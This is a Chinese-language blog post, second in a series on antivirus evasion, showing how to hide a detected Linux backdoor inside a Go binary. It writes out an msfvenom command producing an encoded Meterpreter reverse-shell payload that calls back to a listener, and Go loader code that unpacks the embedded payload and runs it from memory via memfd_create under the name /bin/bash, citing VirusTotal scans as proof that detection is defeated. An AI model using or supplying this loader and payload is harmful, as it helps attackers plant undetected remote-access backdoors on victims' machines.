---
title: 杀软的无奈-最简单的免杀(二)
url: 1683.html
id: 1683
password: fakefake
categories:
  - 学习记录
date: 2021-03-24 19:57:14
tags:
  - 杀软的无奈
---


## 前言

平时比较忙，抽不出来大把的时间来写文章，导致这个系列的更新太过于迟缓了。怕一直找理由鸽了自己，今天先更新一篇水文吧。主要说一下利用现成的工具完成比较简单的免杀工作。

<!-- more -->


## 背景知识

今天要讲的主角其实是go语言。go语言是2009年google发布的语言，由于其有类似于c和c++一样的性能，同时还具备类似于解释性语言的垃圾回收机制，并且不像java一样依赖虚拟机，优秀的跨平台优势和1.4版本之后go语言实现的支持交叉编译的编译器，让它迅速火了起来。

但是优秀的同时，它以牺牲自己二进制的体积为代价，每个go二进制都静态链接了一个runtime库，此库实现了垃圾回收、线程调度、go语言特有的关键特性等任务。此库的功能非常强大，因为导致一个简单的"hello world"就有1700多个函数。
有如此多的函数，那从这一堆函数中找出具有恶意功能的函数简直像大海捞针一样困难，这是市面上的大部分杀毒引擎对go二进制的检测能力比较薄弱的一个原因。

本文主要是用go语言的相关工具，来彻底免杀之前会被查杀的elf恶意代码。(windows平台类似的方法，但是我并没有测试免杀效果。)

## 开始正题

**基本思想就是把一个不免杀的ELF文件作为字节数据存储在go编写的二进制中，然后go二进制执行的时候从自身读出恶意代码然后直接加载到内存中执行，保证恶意代码不落盘**

这个方法非常简单，不需要分析什么shellcode特征，甚至不需要写什么代码，就能实现效果不错的免杀，而且检测比较困难。


可选的工具有很多:

- [https://github.com/gobuffalo/packr](https://github.com/gobuffalo/packr)
- [https://github.com/rakyll/statik](https://github.com/rakyll/statik)
- [https://github.com/GeertJohan/go.rice](https://github.com/GeertJohan/go.rice)
- [https://github.com/UnnoTed/fileb0x](https://github.com/UnnoTed/fileb0x)
- [https://github.com/mjibson/esc](https://github.com/mjibson/esc)
- [https://github.com/kevinburke/go-bindata](https://github.com/kevinburke/go-bindata)
- [https://github.com/lu4p/binclude](https://github.com/lu4p/binclude)
- [https://github.com/omeid/go-resources](https://github.com/omeid/go-resources)
- [https://github.com/pyros2097/go-embed](https://github.com/pyros2097/go-embed)
- [https://github.com/wlbr/mule](https://github.com/wlbr/mule)
- [https://github.com/miscing/embed](https://github.com/miscing/embed)
- [https://github.com/kyioptr/gassets](https://github.com/kyioptr/gassets)

甚至 go1.6 就默认支持[https://go.googlesource.com/proposal/+/master/design/draft-embed.md](https://go.googlesource.com/proposal/+/master/design/draft-embed.md) ，你说开心不开心，默认支持的能有啥特征呢？ 哈哈哈哈

下面就先 https://github.com/kevinburke/go-bindata 来测试一下效果。

1. 用msf生成一个后门

```bash
msfvenom -p  linux/x64/meterpreter/reverse_tcp  -e x86/shikata_ga_nai -i 1 lhost=192.168.1.1 lport=6666 -f elf > ./test
```

这个样本肯定是不免杀的，上传到virustotal上看一下。

![](https://pic.wonderkun.cc/uploads/2021/03/2021-03-25-21-38-06.png)


竟然才仅有4款杀毒软件报毒，这太出乎意料了，是杀毒软件提不动刀了，还是metasploit的编码器太强了？不过 anyway，我们还是用go去加载这个二进制，看一下效果。


2. 使用go-bindata 打包到一个文件中

```bash
# https://github.com/kevinburke/go-bindata
./go-bindata ./test
```

这样就会生成一个  `bindata.go` 的文件，里面以压缩字节的形式存储这 ./test 的数据。

![](https://pic.wonderkun.cc/uploads/2021/03/2021-03-25-21-51-03.png)

接下来在 `bindata.go` 中编写main函数，来让test文件从内存执行:

```go
const (
	mfdCloexec  = 0x0001 // 注意这个syscall 只有 3.17 之后的内核才支持,现在大部分的机器都支持了。
	memfdCreate = 319
)
func main() {
	
	data, err := Asset("test")
	if err != nil {
		// Asset was not found.
		fmt.Println("read test file content error!")
	}
	filename := ""

	fd, _, _ := syscall.Syscall(memfdCreate, uintptr(unsafe.Pointer(&filename)), uintptr(mfdCloexec), 0)

	_, _ = syscall.Write(int(fd), data)
	displayName := "/bin/bash"

	fdPath := fmt.Sprintf("/proc/self/fd/%d", fd)
	_ = syscall.Exec(fdPath, []string{displayName}, nil)

}
```

编译之后，发现这个后门功能正常，上传到 virustotal 再看一下效果。

![](https://pic.wonderkun.cc/uploads/2021/03/2021-03-25-22-10-39.png)

效果还算理想。这里可以放任意的会被杀软干掉的二进制，应该免杀效果都是杠杠的。 

windows平台上也是同样的道理，只是windows没有 `memfd_create` 这样方便的syscall供我们调用，但是 「exe_run_in_memory」也很容易实现，所以都值得一试的。


## reference

- [https://www.proofpoint.com/us/blog/threat-insight/ta416-goes-ground-and-returns-golang-plugx-malware-loader](https://www.proofpoint.com/us/blog/threat-insight/ta416-goes-ground-and-returns-golang-plugx-malware-loader)

- [https://github.com/guitmz/ezuri](https://github.com/guitmz/ezuri)

- [https://www.guitmz.com/running-elf-from-memory/](https://www.guitmz.com/running-elf-from-memory/)

- [https://sysopfb.github.io/malware/2020/02/28/Golang-Wrapper-on-an-old-malware.html](https://sysopfb.github.io/malware/2020/02/28/Golang-Wrapper-on-an-old-malware.html)